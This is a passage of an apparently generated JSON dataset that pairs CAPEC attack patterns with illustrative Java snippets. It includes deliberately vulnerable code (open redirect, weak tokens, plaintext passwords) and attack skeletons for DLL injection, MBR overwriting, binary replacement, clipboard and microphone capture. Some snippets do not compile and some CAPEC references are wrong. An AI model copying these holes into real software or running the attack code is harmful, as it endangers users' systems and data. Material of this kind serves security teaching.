        "code_snippet": "public class HardwareDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection logic\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection logic\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection logic\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection logic\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        HardwareDevice device = new HardwareDevice();\n        device.detectVoltageGlitch();\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-188 (Hardware Fault Injection) by demonstrating how a device might detect and respond to fault injection attempts, thereby protecting sensitive information. The related CWEs are addressed by simulating detection mechanisms for various fault conditions."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class MobileDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection of voltage glitch\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection of clock glitch\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection of overheating\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection of cold environment\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        MobileDevice device = new MobileDevice();\n        device.detectVoltageGlitch(); // Simulate a fault injection attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a mobile device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks, such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by demonstrating how a device might detect and respond to fault injection attacks to protect sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class SmudgeAttackExample {\n    public static void main(String[] args) {\n        try {\n            // Load an image of the touchscreen with smudges\n            BufferedImage image = ImageIO.read(new File(\"touchscreen_smudge.png\"));\n\n            // Analyze the image to detect smudge patterns\n            String detectedPattern = analyzeSmudgePattern(image);\n\n            // Use the detected pattern to bypass authentication\n            if (authenticateUsingPattern(detectedPattern)) {\n                System.out.println(\"Authentication successful using smudge pattern.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String analyzeSmudgePattern(BufferedImage image) {\n        // Placeholder for smudge pattern analysis logic\n        // In a real scenario, this would involve image processing techniques\n        return \"1234\"; // Example detected pattern\n    }\n\n    private static boolean authenticateUsingPattern(String pattern) {\n        // Placeholder for authentication logic\n        // In a real scenario, this would involve checking the pattern against stored credentials\n        return \"1234\".equals(pattern); // Example pattern check\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The code loads an image of a touchscreen with smudges, analyzes the image to detect a smudge pattern, and then attempts to use the detected pattern to bypass authentication. The 'analyzeSmudgePattern' method is a placeholder for the actual image processing logic that would detect the smudge pattern left by the user's fingers. The 'authenticateUsingPattern' method checks if the detected pattern matches a stored pattern, simulating an authentication bypass. This example embodies the main idea of the CAPEC by illustrating how physical side channels (smudges) can be exploited to reveal sensitive information (password/passcode pattern). The related CWEs provide additional context on the importance of protecting against physical side channels and ensuring robust authentication mechanisms."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import java.util.Date;\nimport java.util.Random;\n\npublic class GPSReceiver {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final long TRUE_TIMESTAMP = 1672531199000L; // Example timestamp\n\n    public static void main(String[] args) {\n        GPSReceiver receiver = new GPSReceiver();\n        receiver.receiveGPSSignal();\n    }\n\n    public void receiveGPSSignal() {\n        // Simulate receiving a GPS signal\n        double receivedLatitude = getSpoofedLatitude();\n        double receivedLongitude = getSpoofedLongitude();\n        long receivedTimestamp = getSpoofedTimestamp();\n\n        // Improper verification of source of communication channel (CWE-940)\n        if (verifySource()) {\n            System.out.println(\"Received GPS Coordinates: \" + receivedLatitude + \", \" + receivedLongitude);\n            System.out.println(\"Received Timestamp: \" + new Date(receivedTimestamp));\n        } else {\n            System.out.println(\"Source verification failed.\");\n        }\n    }\n\n    private boolean verifySource() {\n        // Simplified source verification logic\n        return new Random().nextBoolean(); // Randomly pass or fail verification\n    }\n\n    private double getSpoofedLatitude() {\n        // Spoofed latitude\n        return TRUE_LATITUDE + (new Random().nextDouble() - 0.5) * 0.1;\n    }\n\n    private double getSpoofedLongitude() {\n        // Spoofed longitude\n        return TRUE_LONGITUDE + (new Random().nextDouble() - 0.5) * 0.1;\n    }\n\n    private long getSpoofedTimestamp() {\n        // Spoofed timestamp\n        return TRUE_TIMESTAMP + (new Random().nextInt(10000) - 5000);\n    }\n}",
        "description": "This Java code snippet simulates a GPS receiver that receives GPS signals, which could be spoofed by an adversary. The `receiveGPSSignal` method simulates the reception of GPS coordinates and a timestamp. The `verifySource` method, which is supposed to verify the source of the GPS signal, is implemented with a random boolean, representing an improper verification mechanism (CWE-940). The spoofed latitude, longitude, and timestamp are generated with slight random deviations from the true values, embodying the concept of counterfeit GPS signals as described in the CAPEC. This code highlights the vulnerability of GPS receivers to spoofed signals due to inadequate source verification."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import java.util.Random;\n\npublic class GPSSpoofingAttack {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final double SPOOFED_LATITUDE = 40.7128;\n    private static final double SPOOFED_LONGITUDE = -74.0060;\n    private static final double INCREMENT = 0.0001;\n\n    public static void main(String[] args) {\n        double currentLatitude = TRUE_LATITUDE;\n        double currentLongitude = TRUE_LONGITUDE;\n        Random random = new Random();\n\n        while (currentLatitude != SPOOFED_LATITUDE || currentLongitude != SPOOFED_LONGITUDE) {\n            if (random.nextBoolean()) {\n                currentLatitude = incrementTowards(currentLatitude, SPOOFED_LATITUDE);\n            } else {\n                currentLongitude = incrementTowards(currentLongitude, SPOOFED_LONGITUDE);\n            }\n            System.out.println(\"Current GPS Coordinates: \" + currentLatitude + \", \" + currentLongitude);\n            try {\n                Thread.sleep(1000); // Simulate time passing\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"Spoofed GPS Coordinates Reached: \" + currentLatitude + \", \" + currentLongitude);\n    }\n\n    private static double incrementTowards(double current, double target) {\n        if (current < target) {\n            return Math.min(current + INCREMENT, target);\n        } else {\n            return Math.max(current - INCREMENT, target);\n        }\n    }\n}",
        "description": "This Java code snippet simulates a GPS spoofing attack, specifically a 'Carry-Off GPS Attack'. The code starts with the true GPS coordinates and gradually increments them towards the spoofed coordinates. The `incrementTowards` method is used to slowly move the current coordinates towards the target spoofed coordinates, simulating the gradual increase in power of counterfeit signals described in the CAPEC. The `main` method prints the current GPS coordinates at each step, simulating the process of carrying the target away from their intended destination. This code embodies the main idea of the CAPEC by demonstrating how an attacker can manipulate GPS coordinates over time. The related CWEs are represented by the lack of proper verification and integrity checks on the GPS data, allowing the spoofing attack to succeed."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableResourceHandler {\n    private static final String DEVICE_NAME = \"CON\";\n\n    public static void main(String[] args) {\n        String userInput = args[0];\n        try {\n            // CWE-67: Improper Handling of Windows Device Names\n            if (userInput.equalsIgnoreCase(DEVICE_NAME)) {\n                System.out.println(\"Invalid device name\");\n                return;\n            }\n            File file = new File(userInput);\n            FileInputStream fis = new FileInputStream(file);\n            // Simulate resource usage\n            byte[] data = new byte[1024];\n            while (fis.read(data) != -1) {\n                // Process data\n            }\n            // CWE-772: Missing Release of Resource after Effective Lifetime\n            // fis.close(); // This line is commented out to simulate the vulnerability\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-863: Incorrect Authorization\n    public boolean isAuthorized(String userRole) {\n        // Simulate an incorrect authorization check\n        return !userRole.equals(\"guest\"); // This is a simplistic and incorrect check\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources'. The code reads a file based on user input, but it does not handle Windows device names properly (CWE-67), leading to potential denial of service or information exposure. Additionally, the code fails to release the file resource after its effective lifetime (CWE-772), which can lead to resource exhaustion. Finally, the code includes an incorrect authorization check (CWE-863), allowing unauthorized access to resources. These issues collectively represent the misuse and mismanagement of device resources, aligning with the deprecated CAPEC's main idea."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing or empty URL parameter\");\n        }\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a potential TypoSquatting vulnerability by implementing an open redirect (CWE-601). The servlet reads a 'url' parameter from the HTTP request and redirects the user to the specified URL without validating it. This can be exploited by an attacker to redirect users to a malicious site that looks similar to a trusted site (TypoSquatting). The code does not perform any validation or sanitization on the 'url' parameter, making it susceptible to misuse. This example highlights the importance of validating and sanitizing user inputs to prevent security vulnerabilities."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class SoundSquattingExample {\n    public static void main(String[] args) {\n        String trustedDomain = \"trusted-site.com\";\n        String userInputDomain = \"trvsted-site.com\"; // SoundSquatting domain\n\n        if (isTrustedDomain(userInputDomain)) {\n            redirectToDomain(userInputDomain);\n        } else {\n            System.out.println(\"Untrusted domain\");\n        }\n    }\n\n    private static boolean isTrustedDomain(String domain) {\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        try {\n            String ip = java.net.InetAddress.getByName(domain).getHostAddress();\n            String resolvedDomain = java.net.InetAddress.getByName(ip).getHostName();\n            return domain.equals(resolvedDomain);\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private static void redirectToDomain(String domain) {\n        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        try {\n            URL url = new URL(\"http://\" + domain);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setInstanceFollowRedirects(true);\n            connection.connect();\n\n            Scanner scanner = new Scanner(connection.getInputStream());\n            while (scanner.hasNext()) {\n                System.out.println(scanner.nextLine());\n            }\n            scanner.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential SoundSquatting attack scenario. The code checks if a user-provided domain is trusted by performing a reverse DNS resolution (CWE-350). If the domain is considered trusted, it redirects the user to that domain (CWE-601). The trusted domain is 'trusted-site.com', while the user input domain is 'trvsted-site.com', which is a sound-alike domain. This example highlights the vulnerability where an attacker can register a sound-alike domain to mislead users and redirect them to potentially malicious sites."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class HomographAttackExample {\n    public static void main(String[] args) {\n        String userInput = \"http://ex\u0430mple.com\"; // Note: The '\u0430' is a Cyrillic 'a'\n        String trustedDomain = \"http://example.com\";\n\n        if (isValidDomain(userInput, trustedDomain)) {\n            System.out.println(\"Domain is trusted.\");\n        } else {\n            System.out.println(\"Domain is not trusted.\");\n        }\n    }\n\n    public static boolean isValidDomain(String userInput, String trustedDomain) {\n        // CWE-777: Regular Expression without Anchors\n        Pattern pattern = Pattern.compile(\"^\" + Pattern.quote(trustedDomain) + \"$\", Pattern.CASE_INSENSITIVE);\n        Matcher matcher = pattern.matcher(userInput);\n        return matcher.matches();\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The user input contains a domain name with a Cyrillic '\u0430' instead of a Latin 'a', which visually appears the same to the user. The `isValidDomain` method uses a regular expression to check if the user input matches the trusted domain. The regular expression is anchored to ensure the entire string is matched (CWE-777). However, this simplistic check does not account for homoglyphs, making it vulnerable to homograph attacks. The code highlights the importance of properly distinguishing visually similar characters to prevent such attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class TokenImpersonationExample {\n    private static Map<String, String> userTokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user login and token generation\n        String userId = \"user123\";\n        String token = generateToken(userId);\n        userTokens.put(userId, token);\n\n        // Simulate an attacker impersonating the user\n        String attackerToken = generateToken(\"attacker\");\n        userTokens.put(\"attacker\", attackerToken);\n\n        // Attacker uses the victim's token to impersonate\n        if (authenticate(attackerToken, \"user123\")) {\n            System.out.println(\"Attacker successfully impersonated user123\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n\n    private static String generateToken(String userId) {\n        // Weak token generation logic\n        return \"token_\" + userId;\n    }\n\n    private static boolean authenticate(String token, String userId) {\n        // Improper authentication check\n        return userTokens.containsKey(userId) && userTokens.get(userId).equals(token);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of token impersonation. The `generateToken` method creates a weak token based on the user ID, and the `authenticate` method performs an improper authentication check. An attacker can generate a token for themselves and use it to impersonate another user (user123 in this case). This code embodies the main idea of CAPEC-Token Impersonation by exploiting weaknesses in authentication (CWE-287, CWE-1390) and improper token generation (CWE-1270). The code also highlights the risks of weak token assignment and protection (CWE-1259)."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class AudioCapture {\n    public static void main(String[] args) {\n        try {\n            // Define the audio format\n            AudioFormat format = new AudioFormat(16000, 16, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n\n            // Check if the system supports the data line\n            if (!AudioSystem.isLineSupported(info)) {\n                System.out.println(\"Line not supported\");\n                System.exit(0);\n            }\n\n            // Get and open the target data line\n            TargetDataLine targetLine = (TargetDataLine) AudioSystem.getLine(info);\n            targetLine.open(format);\n            targetLine.start();\n\n            // Create a thread to capture the audio\n            Thread captureThread = new Thread(() -> {\n                try (ByteArrayOutputStream out = new ByteArrayOutputStream()) {\n                    byte[] buffer = new byte[1024];\n                    while (true) {\n                        int bytesRead = targetLine.read(buffer, 0, buffer.length);\n                        out.write(buffer, 0, bytesRead);\n                        // Simulate sending data over the network in cleartext\n                        sendOverNetwork(out.toByteArray());\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            captureThread.start();\n        } catch (LineUnavailableException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendOverNetwork(byte[] data) {\n        // Simulate cleartext transmission of sensitive information\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet captures audio from the system's microphone and simulates sending the captured data over the network in cleartext. The code demonstrates the main idea of the CAPEC 'Probe Audio and Video Peripherals' by exploiting the system's audio functionality to capture sensitive information. The code also embodies several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) by sending the captured audio data in cleartext, CWE-267 (Privilege Defined With Unsafe Actions) by potentially allowing unauthorized access to the audio capture functionality, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing the captured audio data to unauthorized entities. The code does not include proper security measures, making it vulnerable to exploitation."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        String userInputFileName = \"example.txt\"; // This should come from user input\n        try {\n            // Check file extension\n            if (!userInputFileName.endsWith(\".txt\")) {\n                throw new IOException(\"Invalid file type\");\n            }\n\n            // Construct file path\n            Path filePath = Paths.get(\"uploads/\" + userInputFileName);\n\n            // Create file\n            File file = new File(filePath.toString());\n            if (file.createNewFile()) {\n                System.out.println(\"File created: \" + file.getName());\n            } else {\n                System.out.println(\"File already exists.\");\n            }\n\n            // Read file content\n            String content = new String(Files.readAllBytes(filePath));\n            System.out.println(\"File content: \" + content);\n        } catch (IOException e) {\n            System.out.println(\"An error occurred.\");\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload mechanism that embodies the main idea of CAPEC-172: 'Alternative Execution Due to Deceptive Filenames'. The code allows a user to upload a file and relies on the file extension to determine its type. However, it does not properly neutralize or validate the file name, leading to potential security issues. The code checks if the file ends with '.txt', but an attacker could upload a file with a deceptive name like 'example.txt.exe' to bypass this check. Additionally, the code constructs the file path using user input without proper sanitization, which could lead to path traversal attacks. This snippet highlights the risks associated with relying on file names or extensions and the importance of proper input validation and sanitization."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousFileHider {\n    public static void main(String[] args) {\n        try {\n            // Create a normal file\n            File file = new File(\"example.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write normal content to the file\n            FileOutputStream fos = new FileOutputStream(file);\n            fos.write(\"This is a normal text file.\".getBytes());\n            fos.close();\n\n            // Hide malicious code in the file's metadata (using extended attributes)\n            String maliciousCode = \"<script>alert('Malicious Code');</script>\";\n            Files.setAttribute(Paths.get(\"example.txt\"), \"user.maliciousCode\", maliciousCode.getBytes());\n\n            System.out.println(\"File created and malicious code hidden in metadata.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might hide malicious data within a file's metadata. The code creates a normal text file and writes some benign content to it. Then, it uses the `Files.setAttribute` method to store a malicious script in the file's extended attributes, which are not typically visible during normal file operations. This approach embodies the CAPEC concept of hiding malicious data within files, making it difficult to discover. The related CWEs provide context on the potential vulnerabilities, such as storing sensitive data in cleartext or under the web root, which could be exploited in similar ways."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.Transferable;\nimport java.awt.Toolkit;\n\npublic class ClipboardDataCollector {\n    public static void main(String[] args) {\n        try {\n            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n            Transferable contents = clipboard.getContents(null);\n            if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {\n                String clipboardData = (String) contents.getTransferData(DataFlavor.stringFlavor);\n                // CWE-318: Cleartext Storage of Sensitive Information in Executable\n                // CWE-317: Cleartext Storage of Sensitive Information in GUI\n                System.out.println(\"Clipboard Data: \" + clipboardData);\n                // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                // CWE-267: Privilege Defined With Unsafe Actions\n                // CWE-222: Truncation of Security-relevant Information\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary could exploit an application to collect data from the clipboard. The code accesses the system clipboard and retrieves its contents if they are in string format. The retrieved data is then printed to the console. This represents the CAPEC 'Collect Data from Clipboard' by showing how sensitive information copied to the clipboard can be accessed by unauthorized applications. The code also touches on several related CWEs: storing sensitive information in cleartext (CWE-318, CWE-317), exposing sensitive system information (CWE-497), performing unsafe actions with privileges (CWE-267), and potentially truncating security-relevant information (CWE-222)."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FirmwareAlteration {\n    private static final String HDD_PATH = \"/dev/sda\";\n    private static final int MBR_SIZE = 512;\n    private static final byte[] MALICIOUS_PAYLOAD = new byte[]{ /* malicious code bytes */ };\n\n    public static void main(String[] args) {\n        try (RandomAccessFile hdd = new RandomAccessFile(HDD_PATH, \"rw\");\n             FileChannel channel = hdd.getChannel()) {\n\n            // Read the original MBR\n            ByteBuffer mbrBuffer = ByteBuffer.allocate(MBR_SIZE);\n            channel.read(mbrBuffer);\n            mbrBuffer.flip();\n\n            // Modify the MBR to include malicious payload\n            for (int i = 0; i < MALICIOUS_PAYLOAD.length; i++) {\n                mbrBuffer.put(i, MALICIOUS_PAYLOAD[i]);\n            }\n\n            // Write the modified MBR back to the HDD\n            mbrBuffer.flip();\n            channel.write(mbrBuffer);\n\n            System.out.println(\"MBR modified successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include a malicious payload. The code opens the HDD device file, reads the original MBR, modifies it by injecting the malicious payload, and writes the modified MBR back to the HDD. This represents the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to achieve persistence on a system. The related CWEs provide context on potential weaknesses that could be exploited, such as insufficient access control for volatile memory (CWE-1274) and missing immutable root of trust in hardware (CWE-1326)."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableFileStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\";\n        File file = new File(\"/tmp/sensitive_info.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"Sensitive data written to \" + file.getAbsolutePath());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access controls. The code writes a string containing sensitive data (a user password) to a file located in the /tmp directory. This directory is typically accessible to all users on the system, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of CAPEC-552 (Probe System Files) and related CWEs, such as CWE-552 (Files or Directories Accessible to External Parties) and CWE-377 (Insecure Temporary File). The code highlights the risk of exposing sensitive information due to improper file protection and insecure temporary file usage."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import com.sun.jna.Library;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\n\npublic class DLLInjectionExample {\n    public interface Kernel32 extends Library {\n        Kernel32 INSTANCE = (Kernel32) Native.loadLibrary(\"kernel32\", Kernel32.class);\n        Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);\n        boolean WriteProcessMemory(Pointer hProcess, Pointer lpBaseAddress, byte[] lpBuffer, int nSize, int[] lpNumberOfBytesWritten);\n        boolean CreateRemoteThread(Pointer hProcess, Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);\n    }\n\n    public static void main(String[] args) {\n        int processId = 1234; // Target process ID\n        String dllPath = \"C:\\\\path\\\\to\\\\malicious.dll\";\n\n        Pointer process = Kernel32.INSTANCE.OpenProcess(0x1F0FFF, false, processId);\n        if (process == null) {\n            System.out.println(\"Failed to open process\");\n            return;\n        }\n\n        byte[] dllBytes = dllPath.getBytes();\n        Pointer remoteMemory = Kernel32.INSTANCE.VirtualAllocEx(process, null, dllBytes.length, 0x3000, 0x40);\n        if (remoteMemory == null) {\n            System.out.println(\"Failed to allocate memory in target process\");\n            return;\n        }\n\n        int[] written = new int[1];\n        boolean writeResult = Kernel32.INSTANCE.WriteProcessMemory(process, remoteMemory, dllBytes, dllBytes.length, written);\n        if (!writeResult) {\n            System.out.println(\"Failed to write to process memory\");\n            return;\n        }\n\n        Pointer loadLibraryAddr = Kernel32.INSTANCE.GetProcAddress(Kernel32.INSTANCE.GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n        if (loadLibraryAddr == null) {\n            System.out.println(\"Failed to get LoadLibrary address\");\n            return;\n        }\n\n        Pointer remoteThread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, loadLibraryAddr, remoteMemory, 0, null);\n        if (remoteThread == null) {\n            System.out.println(\"Failed to create remote thread\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of DLL injection using the Java Native Access (JNA) library. The code targets a process by its ID, allocates memory within the target process, writes the path of a malicious DLL to this memory, and then creates a remote thread to load the DLL into the target process. This embodies the CAPEC concept of 'Inclusion of Code in Existing Process' by injecting and executing arbitrary code within the address space of another process. The related CWEs are represented by the potential for executing commands from an untrusted source (CWE-114), including functionality from an untrusted control sphere (CWE-829), and improper control of dynamically-managed code resources (CWE-913)."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class DLLSideLoadingExample {\n    public static void main(String[] args) {\n        String dllName = \"example.dll\";\n        String appDirectory = \"C:\\\\Program Files\\\\MyApp\\\\\";\n        String untrustedDirectory = \"C:\\\\Untrusted\\\\\";\n\n        // Vulnerable code: loading DLL from an untrusted directory\n        try {\n            Path source = Paths.get(untrustedDirectory + dllName);\n            Path destination = Paths.get(appDirectory + dllName);\n            Files.copy(source, destination, StandardCopyOption.REPLACE_EXISTING);\n            System.load(destination.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where a DLL is loaded from an untrusted directory, embodying the concept of DLL Side-Loading. The code copies a DLL from an untrusted directory to the application's directory and then loads it. This represents CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the DLL is sourced from a location that could be controlled by an attacker. The code does not verify the integrity or authenticity of the DLL, making it susceptible to loading a malicious DLL instead of the legitimate one."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableBinaryReplacement {\n    public static void main(String[] args) {\n        String binaryPath = \"/usr/local/bin/somebinary\";\n        String maliciousBinaryPath = \"/tmp/maliciousbinary\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File binaryFile = new File(binaryPath);\n        if (binaryFile.exists() && binaryFile.canWrite()) {\n            try {\n                // Replace the legitimate binary with a malicious one\n                Files.copy(Paths.get(maliciousBinaryPath), Paths.get(binaryPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n                System.out.println(\"Binary replaced successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Insufficient permissions to replace the binary.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can replace a legitimate binary with a malicious one due to incorrect file permissions (CWE-732). The code checks if the target binary file is writable and, if so, replaces it with a malicious binary. This embodies the main idea of the CAPEC 'Replace Binaries', where adversaries exploit weak file permissions to replace binaries with malware. The code also indirectly touches on CWE-426 (Untrusted Search Path) by assuming the binary paths are trusted without validation."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
